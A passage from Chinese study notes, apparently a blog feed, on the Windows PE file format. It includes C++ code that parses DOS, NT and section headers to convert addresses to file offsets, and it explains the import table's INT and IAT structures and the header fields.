class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            <span class="keyword">int</span> offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            <span class="keyword">int</span> foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//创建DOS对应的结构体指针</span></span><br><span class="line">    _IMAGE_DOS_HEADER* dos;</span><br><span class="line">    <span class="comment">//读取文件，返回文件句柄</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;C:\\Users\\86156\\Desktop\\everEdit.exe&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//根据文件句柄创建映射</span></span><br><span class="line">    HANDLE hMap = <span class="built_in">CreateFileMappingA</span>(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//映射内容</span></span><br><span class="line">    LPVOID pFile = <span class="built_in">MapViewOfFile</span>(hMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//类型转换，用结构体的方式来读取</span></span><br><span class="line">    dos = (_IMAGE_DOS_HEADER*)pFile;</span><br><span class="line">    <span class="comment">//输出dos-&gt;e_magic，以十六进制输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dos-&gt;e_magic:%X\n&quot;</span>, dos-&gt;e_magic);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向PE文件头标志的指针</span></span><br><span class="line">    DWORD* peId;</span><br><span class="line">    <span class="comment">//让PE文件头标志指针指向其对应的地址=DOS首地址+偏移</span></span><br><span class="line">    peId = (DWORD*)((UINT)dos + dos-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//输出PE文件头标志，其值应为4550，否则不是PE文件</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;peId:%X\n&quot;</span>, *peId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向可选PE头的第一个成员magic的指针</span></span><br><span class="line">    WORD* magic;</span><br><span class="line">    <span class="comment">//让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小</span></span><br><span class="line">    magic = (WORD*)((UINT)peId + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD) + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_FILE_HEADER));</span><br><span class="line">    <span class="comment">//输出magic，其值为0x10b代表32位程序，其值为0x20b代表64位程序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic:%X\n&quot;</span>, *magic);</span><br><span class="line">    <span class="comment">//根据magic判断为32位程序还是64位程序</span></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (*magic) &#123;</span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR32_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;32位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为32位程序后，就可以使用_IMAGE_NT_HEADERS来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS* nt;</span><br><span class="line">        <span class="comment">//让PE文件头指针指向其对应的地址</span></span><br><span class="line">        nt = (_IMAGE_NT_HEADERS*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**) <span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span>(cnt&lt; nt-&gt;FileHeader.NumberOfSections)&#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER)*cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x11320</span>,dos,nt,sectionArr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR64_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;64位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为64位程序后，就可以使用_IMAGE_NT_HEADERS64来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS64* nt;</span><br><span class="line">        nt = (_IMAGE_NT_HEADERS64*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址，区别在于这里加上的偏移为_IMAGE_NT_HEADERS64</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span> (cnt &lt; nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER) * cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此代码本是将VA转为FOA值，但由于VA = ImageBase + RVA，我们可以修改增加一句关键代码使其RVA转FOA</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x1CF47C</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015153401402.png" alt="image-20211015153401402"></p>
<p>拿到导出表文件偏移FOA:0x10720</p>
<p>完成定位</p>
<h4 id="导入表结构"><a href="#导入表结构" class="headerlink" title="导入表结构"></a>导入表结构</h4><h4 id="导入表个数"><a href="#导入表个数" class="headerlink" title="导入表个数"></a>导入表个数</h4><p>与导出表不同，导入表通常需要包含多个模块，而不像导出表只需要提供PE文件需要提供的导出函数即可</p>
<p>因此，导出表只有一个，但导入表可能会有多个</p>
<p>当程序运行时，需要依赖几个模块，就有对应几个导出表</p>
<p>导出表的结构体</p>
<p>在C语言中，导出表的结构如下(在winnt.h中有定义)</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015154327762.png" alt="image-20211015154327762"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">成员</th>
<th align="left">数据宽度</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Characteristics</td>
<td align="left">DWORD</td>
<td align="left">标志为0表示结束，没有导入描述符了</td>
</tr>
<tr>
<td align="left">OriginalFirstThunk</td>
<td align="left">DWORD</td>
<td align="left">RVA指向IMAGE_THUNK_DATA结构数组 （桥1）</td>
</tr>
<tr>
<td align="left">TimeDateStamp</td>
<td align="left">DWORD</td>
<td align="left">时间戳</td>
</tr>
<tr>
<td align="left">ForwarderChain</td>
<td align="left">DWORD</td>
<td align="left">链表的前一个结构</td>
</tr>
<tr>
<td align="left">Name</td>
<td align="left">DWORD</td>
<td align="left">RVA，指向DLL名字，该名字以‘\0’为结尾</td>
</tr>
<tr>
<td align="left">FirstThunk</td>
<td align="left">DWORD</td>
<td align="left">RVA指向IMAGE_THUNK_DATA结构数组 （桥2）</td>
</tr>
</tbody></table>
<h4 id="Characteristics"><a href="#Characteristics" class="headerlink" title="Characteristics"></a>Characteristics</h4><p>标志 为0表示结束 没有导入描述符了</p>
<h4 id="IMAGE-THUNK-DATA"><a href="#IMAGE-THUNK-DATA" class="headerlink" title="IMAGE_THUNK_DATA"></a>IMAGE_THUNK_DATA</h4><p>在介绍OriginalFirstThunk之前，要先了解一下OriginalFirstThunk和FirstThunk所指向的<strong>结构数组</strong></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015164516486.png" alt="image-20211015164516486"></p>
<p>指向的数组中每一项为一个结构，此结构名称是<strong>IMAGE_THUNK_DATA</strong></p>
<p>数组<strong>最后以一个内容全为0的IMAGE_THUNK_DATA作为结束</strong></p>
<p>IMAGE_THUNK_DATA实际上只是一个DWORD，但在不同的时刻却拥有不同的解释</p>
<p>IMAGE_THUNK_DATA有<strong>两种解释</strong>：</p>
<ul>
<li>DWORD最高位为0，那么该数值是一个RVA，指向_IMAGE__IMPORT_BY_NAME结构，表明函数是<strong>字符串类型的函数名导入的</strong></li>
<li>DWORD最高位为1，那么该数值的低31位就是函数的<strong>导出函数的序号</strong></li>
</ul>
<p>_IMAGE_IMPORT_BY_NAME结构:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;</span><br><span class="line">    BYTE    Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure>

<p>该结构即为：”编号—名称”（Hint/Name）描述部分</p>
<ul>
<li>Hint：导出函数地址表的<strong>索引编号</strong>，可能为空且<strong>不一定准确</strong>，由编译器决定，一般不使用该值</li>
<li>Name：这个是一个以”\0”结尾的字符串，表示函数名</li>
</ul>
<p>此时可发现，IMAGE_THUNK_DATA最终提供的数据只有两个：</p>
<ul>
<li>DWORD最高位为0时：需要导入函数的名称（Hint不一定准确，所以不使用）</li>
<li>DWORD最高位为1时：需要导入的函数在导出表中的序号</li>
</ul>
<p>此处对应了导出表笔记中的由导出表获得导出函数所需的两种方法</p>
<ol>
<li>根据函数名称获取导出函数地址</li>
<li>根据函数序号获取导出函数地址</li>
</ol>
<h4 id="OriginalFirstThunk"><a href="#OriginalFirstThunk" class="headerlink" title="OriginalFirstThunk"></a>OriginalFirstThunk</h4><p>因为它是指向另外数据结构的通路，因此简称为桥1。该字段指向一个包含了一系列结构的数组：IMAGE_THUNK_DATA</p>
<p>桥1所指向的地址列表被定义为：<strong>INT</strong>（Import Name Table） 导入名称表</p>
<h2 id="导入表的双桥结构"><a href="#导入表的双桥结构" class="headerlink" title="导入表的双桥结构"></a>导入表的双桥结构</h2><p>桥1 与 桥 2 最终的目的地都是一致的，都指向了引入函数的“编号-名称”（Hint/Name）描述部分</p>
<p>桥1到IMAGE_THUNK_DATA的过程中，经过了：<strong>INT</strong>（Import Name Table) 导入名称表</p>
<p>而桥2到IMAGE_THUNK_DATA的过程中，经过了: <strong>IAT</strong>（Import Address Table）导入地址表</p>
<h4 id="PE文件加载前"><a href="#PE文件加载前" class="headerlink" title="PE文件加载前"></a>PE文件加载前</h4><p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015193909496.png" alt="image-20211015193909496"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015194546419.png" alt="image-20211015194546419"></p>
<h4 id="PE文件载入后"><a href="#PE文件载入后" class="headerlink" title="PE文件载入后"></a>PE文件载入后</h4><p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015194834185.png" alt="image-20211015194834185"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015194759949.png" alt="image-20211015194759949"></p>
<h4 id="加载前后对比"><a href="#加载前后对比" class="headerlink" title="加载前后对比"></a>加载前后对比</h4><ul>
<li>在PE文件加载前: 桥1指向INT和桥2指向的IAT的数据是<strong>相同</strong>的,但是其<strong>存储的位置是不同的</strong></li>
<li>在PE文件加载后：桥1指向的INT<strong>不变</strong>，但桥2指向的IAT的数值变成了函数相应的RVA地址</li>
</ul>
<p>另：函数相应的RVA地址是根据IAT中的函数名称或者导入表中的序号获得的。</p>
<h4 id="根据结构分析导入表"><a href="#根据结构分析导入表" class="headerlink" title="根据结构分析导入表"></a>根据结构分析导入表</h4><p>回到先前得到的导入表的FOA，在16进制编辑器中跳转至FOA：0x1CDA7C位置</p>
]]></content>
      <categories>
        <category>PE结构</category>
      </categories>
      <tags>
        <tag>PE结构</tag>
      </tags>
  </entry>
  <entry>
    <title>PE结构-系统解密篇（1）</title>
    <url>/2021/10/12/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87(1)/</url>
    <content><![CDATA[<p><strong>学习课程-鱼C-小甲鱼【系统篇】《解密系列》单看课程记不住，想着好记性不如烂笔头，特此记录学习加深理解。</strong></p>
<h2 id="PE结构的概念"><a href="#PE结构的概念" class="headerlink" title="PE结构的概念"></a>PE结构的概念</h2><h3 id="EXE与DLL文件的区别"><a href="#EXE与DLL文件的区别" class="headerlink" title="EXE与DLL文件的区别"></a>EXE与DLL文件的区别</h3><p>EXE与DLL文件之间的区别完全是语意上面的，因为他们使用了完全相同的PE格式。唯一的区别在与是用一个字段标示出这个文件是EXE还是DLL文件格式。 </p>
<span id="more"></span>

<h3 id="64位与32位PE文件的区别"><a href="#64位与32位PE文件的区别" class="headerlink" title="64位与32位PE文件的区别"></a>64位与32位PE文件的区别</h3><p>64位的Windows仅仅知识对PE格式做了一些简单的修饰，新格式叫做PE32+ 并没有任何新的结构加进去，改变的只是简单的将32位字段扩展为64位，一般会在名称上表现出来：例如IMAGE_NT_HEADERS32 或 IMAGE_NT_HEADER64 来表示此结构用于32位还是64位PE文件。</p>
<h3 id="PE格式的定义"><a href="#PE格式的定义" class="headerlink" title="PE格式的定义"></a>PE格式的定义</h3><p>PE格式定义的主要地方位于头文件winnt.h，这个头文件中几乎能找到所有关于PE文件的定义。</p>
<p><strong>PE文件的架构结构</strong></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012105635817.png" alt="image-20211012105635817"></p>
<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ul>
<li><p>PE文件使用的是一个平面地址空间，所有代码和数据都被合并在一起，组成一个很大的结构。</p>
</li>
<li><p>文件的内容被分割为不同的区块，块中包含代码或数据。各个区块按页边界来对齐，区块没有大小限制，是一个连续的结构。</p>
</li>
<li><p>此外，区块中的每个块有自己在内存中的一套属性，比如说这个区块是否包含代码，数据，是否可读或可写等权限的限制。</p>
</li>
<li><p>PE文件并不是作为单一内存映射文件而被装入内存的；Windows装载器(PE装载器)遍历PE文件并决定文件的哪一部分被映射，这种映射方式是将文件较高的偏移位置映射到 映射到较高的内存地址。映射后其结构某项的偏移地址可能区别于原始的偏移地址，但文件的整体结构不会发生改变。</p>
</li>
<li><p>磁盘文件一旦被映射装入内存，磁盘上的数据结构布局和内存中的数据结构布局是一致的。</p>
</li>
<li><p>数据之间的相对位置可能会发生改变，其某项的偏移地址可能会区别与原始的偏移地址，但不管如何，所有表现出来的信息都允许（接受）从磁盘文件偏移到内存偏移的转换。</p>
</li>
<li><p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012111242647.png" alt="image-20211012111242647"></p>
</li>
<li><p>PE文件块之间之所以会产生空隙，是因为需要进行对齐，便于磁盘内存管理。</p>
</li>
<li><p>PE文件通过Windows装载器装载进内存中后，DOS头、PE头和区块表的偏移位置与大小均不会发生改变，而各个区块映射到内存中后，其偏移位置则会发生改变。</p>
</li>
<li><p>磁盘中的PE文件与内存中的模块之间的偏移位置有可能会发生变化，是由于IMAGE_OPTIONAL_HEADER结构中的FileAlignment 与 SectionAlignment之间的值不同导致对齐标准不一而造成的。</p>
</li>
</ul>
<h3 id="PE结构的几个概念"><a href="#PE结构的几个概念" class="headerlink" title="PE结构的几个概念"></a>PE结构的几个概念</h3><p><strong>基地址 （ImageBase）</strong></p>
<p>是PE文件映射到内存文件后的PE结构的头地址，这个地址被称之为基地址。PE文件被映射到内存中后我们可以称之为一个<strong>模块(Module)</strong> , 其内存中的基地址就是模块的<strong>句柄(HModule)</strong>,获得句柄之后，也就是拿到了Pe结构的头部，根据头部中所存放的信息，我们拿到整个PE文件。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//LPCTSTR lpModulename 存有模块名的指针</span></span><br><span class="line"><span class="comment">//函数返回对应模块的句柄</span></span><br><span class="line"><span class="function">HMODULE <span class="title">GetModuleHandle</span><span class="params">(LPCTSTR lpModuleName)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>文件偏移地址</strong></p>
<p>PE文件的头地址在自身PE结构中都以0为开始地址，其他区块较头地址所相差的地址即为偏移地址</p>
<p><strong>虚拟地址(VA)与相对虚拟地址(RVA)</strong></p>
<p>虚拟地址:各个区块映射至内存之中可能会发生比例变化，为指出在内存中已经发生比例变化的各个区块的 地址，引出了**虚拟地址(VA)**的概念 。</p>
<p>相对虚拟地址:与PE文件的偏移地址相似，某一虚拟地址-基地址=相对虚拟地址</p>
<h2 id="各大部分"><a href="#各大部分" class="headerlink" title="各大部分"></a>各大部分</h2><p>MS-DOS头部</p>
<ul>
<li><p>根据上文的结构图可知，PE文件首个部分便是DOS头，有了DOS头，我们才能在DOS环境下执行PE文件，DOS系统才可识别出这是一个有效的执行体来从而执行。</p>
</li>
<li><p>PE文件的第一个字节起始于一个传统的MS-DOS头部，被称为IMAGE_DOS_HEADER。</p>
</li>
</ul>
<p><strong>IMAGE_DOS_HEADER</strong>(左侧+0h一列是文件头的偏移量)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">IMAGE_DOS_HEADER STRUCT</span><br><span class="line">&#123;</span><br><span class="line">+<span class="number">0</span>h WORD e_magic    <span class="comment">// Magic DOS signature MZ(4Dh 5Ah)     DOS可执行文件标记</span></span><br><span class="line">+<span class="number">2</span>h WORD e_cblp    <span class="comment">// Bytes on last page of file</span></span><br><span class="line">+<span class="number">4</span>h WORD e_cp    <span class="comment">// Pages in file</span></span><br><span class="line">+<span class="number">6</span>h WORD e_crlc    <span class="comment">// Relocations</span></span><br><span class="line">+<span class="number">8</span>h WORD e_cparhdr   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">+<span class="number">0</span>ah WORD e_minalloc   <span class="comment">// Minimun extra paragraphs needs</span></span><br><span class="line">+<span class="number">0</span>ch WORD e_maxalloc  <span class="comment">// Maximun extra paragraphs needs</span></span><br><span class="line">+<span class="number">0</span>eh WORD e_ss            <span class="comment">// intial(relative)SS value        DOS代码的初始化堆栈SS</span></span><br><span class="line">+<span class="number">10</span>h WORD e_sp     <span class="comment">// intial SP value                       DOS代码的初始化堆栈指针SP</span></span><br><span class="line">+<span class="number">12</span>h WORD e_csum     <span class="comment">// Checksum</span></span><br><span class="line">+<span class="number">14</span>h WORD e_ip     <span class="comment">// intial IP value               DOS代码的初始化指令入口[指针IP]</span></span><br><span class="line">+<span class="number">16</span>h WORD e_cs     <span class="comment">// intial(relative)CS value         DOS代码的初始堆栈入口</span></span><br><span class="line">+<span class="number">18</span>h WORD e_lfarlc     <span class="comment">// File Address of relocation table</span></span><br><span class="line">+<span class="number">1</span>ah WORD e_ovno         <span class="comment">// Overlay number</span></span><br><span class="line">+<span class="number">1</span>ch WORD e_res[<span class="number">4</span>]      <span class="comment">// Reserved words</span></span><br><span class="line">+<span class="number">24</span>h WORD e_oemid      <span class="comment">// OEM identifier(for e_oeminfo)</span></span><br><span class="line">+<span class="number">26</span>h WORD      e_oeminfo   <span class="comment">// OEM information;e_oemid specific</span></span><br><span class="line">+<span class="number">29</span>h WORD e_res2[<span class="number">10</span>]   <span class="comment">// Reserved words</span></span><br><span class="line">+<span class="number">3</span>ch DWORD   e_lfanew     <span class="comment">//  Offset to start of PE header      指向PE文件头</span></span><br><span class="line">&#125; IMAGE_DOS_HEADER ENDS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e_magic：一个WORD类型，值是一个常数<span class="number">0x4D5A</span>，用文本编辑器查看该值位‘MZ’，可执行文件必须都是<span class="string">&#x27;MZ&#x27;</span>开头。</span><br><span class="line">e_lfanew：为<span class="number">32</span>位可执行文件扩展的域，用来表示DOS头之后的NT头相对文件起始地址的偏移。</span><br></pre></td></tr></table></figure>



<h3 id="PE文件头"><a href="#PE文件头" class="headerlink" title="PE文件头"></a>PE文件头</h3><ul>
<li>PE文件头（PE Header）紧挨着DOS stub</li>
<li>PE Header是PE相关结构NT映像头（IMAGE_NT_HEADER）的简称，里面包含着许多PE装载器用到的重要字段</li>
<li>执行体在支持PE文件结构的操作系统中执行时，PE装载器将从IMAGE_DOS_HEADER结构中的e_lfanew字字段里找到PE Header的起始偏移量，加上基地址就得到PE文件头的指针</li>
<li>PNTHeader  = ImageBase + dosHeader -&gt;e_lfanew</li>
</ul>
<h3 id="IMAGE-NT-HEADERS结构"><a href="#IMAGE-NT-HEADERS结构" class="headerlink" title="IMAGE_NT_HEADERS结构"></a>IMAGE_NT_HEADERS结构</h3><p>PE Header 是PE相关结构NT映像头（IMAGE_NT_HEADER）的简称，里面包含着许多PE装载器要用到的重要字段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> IMAGE_NT_HEADERS STRUCT </span><br><span class="line">&#123; </span><br><span class="line">+<span class="number">0</span>h  DWORD	Signature  <span class="comment">//标示这是否是一个有效的PE文件</span></span><br><span class="line">+<span class="number">4</span>h  IMAGE_FILE_HEADER FileHeader <span class="comment">//</span></span><br><span class="line">+<span class="number">18</span>	 hIMAGE_OPTIONAL_HEADER32	OptionalHeader   <span class="comment">//</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS ENDS</span><br></pre></td></tr></table></figure>

<p><strong>Signature</strong></p>
<p> 在一个有效的 PE 文件里，Signature 字段被设置为00004550h, ASCII 码字符是“PE00”。标志这 PE 文件头的开始，于16进制编辑器中为50 45 00 00h ,进制转换后为00 00 45 50h。</p>
<p>DOS头部的指针e_lfanew指向PE头的首地址，从而找到PE文件头</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012122520702.png" alt="image-20211012122520702"></p>
<p><strong>IMAGE_FILE_HEADER 结构</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> 	<span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line">+<span class="number">04</span>h	WORD  		Machine;                              	<span class="comment">// 运行平台</span></span><br><span class="line"></span><br><span class="line">+<span class="number">06</span>h  	WORD  		NumberOfSections;			<span class="comment">// 文件的区块数目</span></span><br><span class="line"></span><br><span class="line">+<span class="number">08</span>h	DWORD 		TimeDateStamp;			<span class="comment">// 文件创建日期和时间</span></span><br><span class="line"></span><br><span class="line">+<span class="number">0</span>Ch  	DWORD 		PointerToSymbolTable;		<span 